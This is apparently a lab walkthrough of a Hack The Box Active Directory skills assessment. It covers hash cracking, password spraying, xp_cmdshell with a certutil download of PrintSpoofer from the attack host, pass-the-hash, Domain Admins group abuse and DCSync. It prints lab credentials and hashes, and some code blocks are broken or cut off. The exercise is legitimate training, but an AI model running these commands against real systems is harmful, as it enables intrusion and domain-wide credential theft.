## Scenario

Our client Inlanefreight has hired us again to conduct a full-scope internal penetration test. The client aims to find and remediate as many vulnerabilities as possible before undergoing a merger and acquisition process. The new CISO is particularly concerned about more nuanced AD security flaws that may have gone unnoticed during previous penetration tests.

The client is not worried about evasive or stealthy tactics and has also provided us with a Parrot Linux VM within the internal network to achieve the best possible coverage from all network and Active Directory environment angles. Connect to the internal attack host via SSH (you can also connect to it using `xfreerdp` as shown at the start of this module) and begin searching for a foothold in the domain. Once you have a foothold, enumerate the domain and look for vulnerabilities that can be used to move laterally, escalate privileges, and achieve domain compromise.

Apply what you've learned in this module to compromise the domain and answer the questions below.

### Objective


```
SSH o RDP a 10.129.26.140 (ACADEMY-EA-PAR01-SA2)
usuario " htb-student "
contraseña " HTB_@cademy_stdnt! "
```

These hashes are in a poorly readable format, but if we pass them to ChatGPT, it can reformat them to help us better read the content and understand which hash is which.

```
• Fecha y Hora: 2024-07-29 22:55:02
• IP Cliente: 172.16.7.3
• Usuario: INLANEFREIGHT\AB920
• Hash: FC356D6ADC6D88DF90AC4AE7C5A81948
• Full Hash:
AB920::INLANEFREIGHT:0c6498a2a4acd121:FC356D6ADC6D88DF90AC4AE7C5A81948:
```

So we'll save this hash to a file and then crack it to get the plaintext password:

```
john --wordlist=/usr/share/wordlists/rockyou.txt AB920-hash 
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
weasal           (AB920) 
```

Note title: Untitled

We already have the first compromised credentials: `AB920:weasal`

### Question 2

Submit the contents of the file C:\flag.txt on MS01.

First, we need to know which machines are on the network to determine our target. We can use fping to discover hosts in an AD infrastructure:


```
fping -asgq 172.16.7.0/24

172.16.7.3
172.16.7.50
172.16.7.60
172.16.7.240 # Nuestra máquina actual

     510 targets
       4 alive
     506 unreachable
       0 unknown addresses
```
Note title: Untitled

Or we could do a [[Pins Sweep for host discovering]] with these one-liners:
#### Ping Sweep For Loop on Linux Pivot Hosts
`for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done`
#### Ping Sweep For Loop Using CMD
`for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"`
#### Ping Sweep Using PowerShell

`1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.16.5.$($_) -quiet)"}`

With mblookup from Linux we can see the names of these machines to identify which one is MS01:


```

Now that we know what MS01 is, we can try to connect using several methods. Let's test via RDP:

```
┌─[htb-student@skills-par01]─[~]
└──╼ $xfreerdp /v:172.16.7.50 /u:AB920 /p:weasal /drive:share,/home/htb-student /size:80%
```

**Note**: As you can see, we created a shared resource `/drive:share,/home/htb-student` to access the attacker machine's scripts from the Windows machine via a shared drive, and vice versa.

![](https://afsh4ck.gitbook.io/ethical-hacking-cheatsheet/~gitbook/image?url=https%3A%2F%2F2648005400-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FRolFIJKRJaxKzAUqQKJb%252Fuploads%252FoTHG3Jf56VFzpXr3sPyh%252Fimage.png%3Falt%3Dmedia%26token%3D18720459-b9d1-4dcd-87f3-0c24f55153c1&width=768&dpr=3&quality=100&sign=f8d4025a&sv=2)

We successfully obtain the flag! 🏆

### Question 3

Use a common method to obtain weak credentials for another user. Submit the username of the user whose credentials you obtain. What is this user's password?

From the Windows machine MS01, we'll import PowerView and extract a list of domain users with the following PowerShell query:

```
PS C:\Users\AB920\Desktop> Import-Module .\powerview.ps1
PS C:\Users\AB920\Desktop> Get-DomainUser * | Select-Object -ExpandProperty samaccountname | ForEach-Object { $_.TrimEnd() } | Set-Content -Path .\users.txt
PS C:\Users\AB920\Desktop> ls

    Directory: C:\Users\AB920\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        7/30/2024   5:36 AM         791191 powerview.ps1
-a----        7/30/2024   5:42 AM          20322 users.txt

PS C:\Users\AB920\Desktop> cat users.txt
Administrator
Guest
krbtgt
NY340
RO050
FF479
EU303
SX681
AJ725
PH432
GB804
PE286
<------SNIP------>
```

This creates a users.txt file containing all domain users. At this point, we'll perform a Password Spray with Kerbrute as shown in section [[4.3.2 - Internal Password Spray - from Windows]], specifying a password like `Welcome1`:

```
PS C:\Users\AB920> .\kerbrute-windows.exe passwordspray -d inlanefreight.local --dc 172.16.7.3 .\users.txt Welcome1
```

Note title: Untitled

![](https://afsh4ck.gitbook.io/ethical-hacking-cheatsheet/~gitbook/image?url=https%3A%2F%2F2648005400-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FRolFIJKRJaxKzAUqQKJb%252Fuploads%252Fym3iJXLwoFY7PBKat64w%252Fimage.png%3Falt%3Dmedia%26token%3D889528c5-9c5d-48eb-bf9c-e7b9702dcd41&width=768&dpr=3&quality=100&sign=e82eb121&sv=2)

Boom! We found a valid user: `BR086:Welcome1`

### Question 4

Find a configuration file containing an MSSQL connection string. What is the password for the user listed in this file?

Now that we have a valid user, we'll switch the PowerShell session to this `BR086` user using runas:


```
runas /netonly /user:INLANEFREIGHT@BR086 powershell
```

Note title: Untitled

![](https://afsh4ck.gitbook.io/ethical-hacking-cheatsheet/~gitbook/image?url=https%3A%2F%2F2648005400-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FRolFIJKRJaxKzAUqQKJb%252Fuploads%252FkgDefmATl4wh5WMiR93%252Fimage.png%3Falt%3Dmedia%26token%3D25259fdb-d1e5-428d-b525-c68376ad4689&width=768&dpr=3&quality=100&sign=26a8f452&sv=2)

At this point we'll use Snaffler[[4.5.2 - Credentialed Enumeration - from Windows]] to search for configuration files that may contain credentials:

```
.\Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data
```

We found the credentials to access SQL01 `netdb:D@ta_bAse_adm1n!`, which as we saw earlier corresponds to the IP `172.16.7.60`

```
┌─[htb-student@skills-par01]─[~]
└──╼ $nmblookup -A 172.16.7.60
Looking up status of 172.16.7.60
	SQL01           <00> -         B <ACTIVE> # SQL01
```

### Question 5

Send the contents of the file flag.txt on the Administrator's Desktop on the host `SQL01`.

We will connect to the database with this user as follows:

```
┌─[htb-student@skills-par01]─[~]
└──╼ $impacket-mssqlclient netdb:'D@ta_bAse_adm1n!'\@172.16.7.60

Once inside the database, we enable `enable_xp_cmdshell` which allows us to execute commands. We see we have `SEImpersonatePrivilege` permissions: [[4.10.1 - ES Privileged Access]]

```

SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled

At this point we set up a local Python server to send `PrintSpoofer64.exe` to SQL01:

![](https://afsh4ck.gitbook.io/ethical-hacking-cheatsheet/~gitbook/image?url=https%3A%2F%2F2648005400-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FRolFIJKRJaxKzAUqQKJb%252Fuploads%252FKMANxCQrXoLmC6YC2xri%252Fimage.png%3Falt%3Dmedia%26token%3D2277a7d9-c103-4acc-b354-3835d30ff42d&width=768&dpr=3&quality=100&sign=2b550818&sv=2)

We can download it to SQL01 with the following command. Note we're downloading it to the Windows `temp` folder, which typically has no restrictions:

```
SQL> xp_cmdshell certutil -urlcache -split -f "http://172.16.7.240:8989/PrintSpoofer64.exe" C:\Windows\temp\PrintSpoofer64.exe
```

Note title: Untitled

![](https://afsh4ck.gitbook.io/ethical-hacking-cheatsheet/~gitbook/image?url=https%3A%2F%2F2648005400-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FRolFIJKRJaxKzAUqQKJb%252Fuploads%252FNZjtKjmxmU6iOjgyxwY5%252Fimage.png%3Falt%3Dmedia%26token%3D3251fd01-4a3a-45de-ae1f-2eb809c18dfd&width=768&dpr=3&quality=100&sign=a805bad&sv=2)

Once downloaded, PrintSpoofer will allow us to change the Administrator user's password to `Welcome1` as follows:

```
SQL> xp_cmdshell C:\Windows\temp\PrintSpoofer64.exe -c "net user administrator Welcome1"
output                                                                             

--------------------------------------------------------------------------------   

[+] Found privilege: SeImpersonatePrivilege                                        

[+] Named pipe listening...                                                        

[+] CreateProcessAsUser() OK                                                       

NULL                                                                               

SQL> 
```

After changing the Administrator password, we can access it with smbclient for example and retrieve the flag from the Administrator's Desktop:

![](https://afsh4ck.gitbook.io/ethical-hacking-cheatsheet/~gitbook/image?url=https%3A%2F%2F2648005400-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FRolFIJKRJaxKzAUqQKJb%252Fuploads%252F1EOayI3k4DpUttPSdCEz%252Fimage.png%3Falt%3Dmedia%26token%3D7d8771f3-d7a4-4028-a0dc-60e27cd07ee3&width=768&dpr=3&quality=100&sign=fe2c7c08&sv=2)

We now have the flag!

### Question 6

Submit the contents of the flag.txt file on the Administrator's Desktop on host MS01.

At this point, we'll start a Web Delivery listener in Metasploit and execute it on SQL01 to gain better access.

![](https://afsh4ck.gitbook.io/ethical-hacking-cheatsheet/~gitbook/image?url=https%3A%2F%2F2648005400-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FRolFIJKRJaxKzAUqQKJb%252Fuploads%252FRJvfeHqplRw26Yj5Bt9R%252Fimage.png%3Falt%3Dmedia%26token%3D07c64669-a266-45b2-94c4-97303ef74ec5&width=768&dpr=3&quality=100&sign=f5c67e68&sv=2)

Configuring options in MSF Web Delivery

We found some interesting credentials: `mssqlsvc:Sup3rS3cur3maY5ql$3rverE`

Observing this user `mssqlsvc` in Bloodhound, we see that it belongs to the `Tier II Server Admins` group, which has RDP administration permissions on MS01:

![](https://afsh4ck.gitbook.io/ethical-hacking-cheatsheet/~gitbook/image?url=https%3A%2F%2F2648005400-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FRolFIJKRJaxKzAUqQKJb%252Fuploads%252FgQJnu9OuAPXmMP6KPjTM%252Fimage.png%3Falt%3Dmedia%26token%3Dcef5e683-34b7-4c86-9afd-79f97de1bf84&width=768&dpr=3&quality=100&sign=1c8e3fb&sv=2)

We tried several ways to access with this user, but none worked.
#### Accessing MS01 with Evil WinRM as Admin

We are going to perform a pass the hash with the administrator user's hash. First, we will verify that we can access with crackmapexec:


```
┌─[✗]─[htb-student@skills-par01]─[~/Downloads]
└──╼ $crackmapexec winrm 172.16.7.50 -u Administrator -H bdaffbfe64f1fc646a3353be1c2c3c99

WINRM       172.16.7.50     5985   NONE             [*] None (name:172.16.7.50) (domain:None)
WINRM       172.16.7.50     5985   NONE             [*] http://172.16.7.50:5985/wsman
WINRM       172.16.7.50     5985   NONE             [+] None\Administrator:bdaffbfe64f1fc646a3353be1c2c3c99 (Pwn3d!)
```

Note title: Untitled

Pwned! We can access:

![](https://afsh4ck.gitbook.io/ethical-hacking-cheatsheet/~gitbook/image?url=https%3A%2F%2F2648005400-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FRolFIJKRJaxKzAUqQKJb%252Fuploads%252FhfxJZywdamZyVVD1JLjc%252Fimage.png%3Falt%3Dmedia%26token%3Db0f81fde-f162-47f9-aea1-a397e0670025&width=768&dpr=3&quality=100&sign=d56f493b&sv=2)

And we successfully obtain the flag. Let's connect via RDP to gain more control:

```
xfreerdp /v:172.16.7.50 /u:Administrator /pth:bdaffbfe64f1fc646a3353be1c2c3c99 /drive:share,/home/htb-student /size:80%
```

Note title: Untitled

![](https://afsh4ck.gitbook.io/ethical-hacking-cheatsheet/~gitbook/image?url=https%3A%2F%2F2648005400-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FRolFIJKRJaxKzAUqQKJb%252Fuploads%252FLZHle7y55zHjEVfIYYwH%252Fimage.png%3Falt%3Dmedia%26token%3D684a030b-28cb-4ebf-83cf-3585ebedec5e&width=768&dpr=3&quality=100&sign=81431997&sv=2)

We have RDP restrictions with Pass the Hash, which is a common security measure, but we already know what needs to be done to remove this. We reconnect with evil-winrm and execute this line:

```
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```


```
┌─[✗]─[htb-student@skills-par01]─[~/Downloads]
└──╼ $evil-winrm -i 172.16.7.50 -u Administrator -H bdaffbfe64f1fc646a3353be1c2c3c99

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
The operation completed successfully.
```

We should now be able to access MS01 via RDP as Administrators:

![](https://afsh4ck.gitbook.io/ethical-hacking-cheatsheet/~gitbook/image?url=https%3A%2F%2F2648005400-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FRolFIJKRJaxKzAUqQKJb%252Fuploads%252FVkS105PHpWB7WA7aVw0g%252Fimage.png%3Falt%3Dmedia%26token%3D94dd6afa-33f1-4163-8d8b-9482e3314216&width=768&dpr=3&quality=100&sign=6e71641a&sv=2)

We open PowerShell as administrator and continue enumerating information.

### Question 7

Obtain the credentials of a user with GenericAll rights over the `Domain Admins` group. What is the account name of this user? Decrypt this user's password hash and submit the plaintext password as the answer.

In Bloodhound, we find that this Administrator user can perform a DCSync attack, allowing us to dump all domain user hashes:

![](https://afsh4ck.gitbook.io/ethical-hacking-cheatsheet/~gitbook/image?url=https%3A%2F%2F2648005400-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FRolFIJKRJaxKzAUqQKJb%252Fuploads%252F1Gu6ZhJGYLFOOgUPt2pG%252Fimage.png%3Falt%3Dmedia%26token%3D271618b6-d411-4d36-9dbc-13cd8fca13af&width=768&dpr=3&quality=100&sign=caf21c2c&sv=2)

We also find another interesting user we could attempt to compromise: `CT059`, who has `Generic All` permissions over most domain Administrator groups, such as `Domain Admins` or `Administratorsshe`. This would allow us, for example, to add a known user to a privileged group like Domain Admins:

![](https://afsh4ck.gitbook.io/ethical-hacking-cheatsheet/~gitbook/image?url=https%3A%2F%2F2648005400-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FRolFIJKRJaxKzAUqQKJb%252Fuploads%252F2PSmRJB7n2MRZySenthS%252Fimage.png%3Falt%3Dmedia%26token%3Dcdab337a-d043-44d6-9549-85be16b61f01&width=768&dpr=3&quality=100&sign=b2aeeedf&sv=2)

Now, in a PowerShell session as Administrator, we'll run Inveigh and wait to capture this user's hash:

![](https://afsh4ck.gitbook.io/ethical-hacking-cheatsheet/~gitbook/image?url=https%3A%2F%2F2648005400-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FRolFIJKRJaxKzAUqQKJb%252Fuploads%252FYnFgTIbJ5Dbuv88s7SBh%252Fimage.png%3Falt%3Dmedia%26token%3D1caf59d1-7d46-4c09-943f-3aa5b412fbc5&width=768&dpr=3&quality=100&sign=5554ba0e&sv=2)


```
CT059::INLANEFREIGHT:E680B74BA018965C:044D0E234F3989C43FF428C578892D56:
```

We've got the hash! Now let's crack it offline to get the plaintext password:

```
afsh4ck@kali$ john --wordlist=/usr/share/wordlists/rockyou.txt CT059_hash                
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
charlie1         (CT059)  
```

Note title: Untitled

Boom! We've already compromised user CT059:

```
CT059:charlie1
```

### Question 8

Send the contents of the file flag.txt on the administrator's desktop on host DC01

Therefore, we must add any compromised user whose credentials we have to the domain administrators group with the "`GenericAll`" capability. In my case, I will add the user "`AB920`" and maintain a session on the host SQL01.inlanefreight. You can run these commands on the MS01 host, it will work the same way:


```
$SecPassword = ConvertTo-SecureString 'charlie1' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\CT059', $SecPassword)
```

We import PowerView and add user AB920 to the Domain Admins group:

```
Import-Module PowerView.ps1
Add-DomainGroupMember -Identity 'Domain Admins' -Members 'AB920' -Credential $Cred
```

We can verify that the user has been successfully added to the Domain Admins group:

```
PS C:\Users\public> Get-DomainGroupMember -Identity 'Domain Admins'

```
impacket-secretsdump -just-dc AB920:weasal@172.16.7.3 -outputfile dcsync_hashes  
```

Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:7eba70412d81c1cd030d72a3e8dbe05f:::

The krbtgt allows us to sign any golden tickets we want, giving us persistence and making us undetectable.
#### Access to DC01

On the MS01 machine as Administrator, we runas the user CT059 and change the Domain Administrator password to `Welcome1`:

```
runas /netonly /user:INLANEFREIGHT\CT059 powershell
```
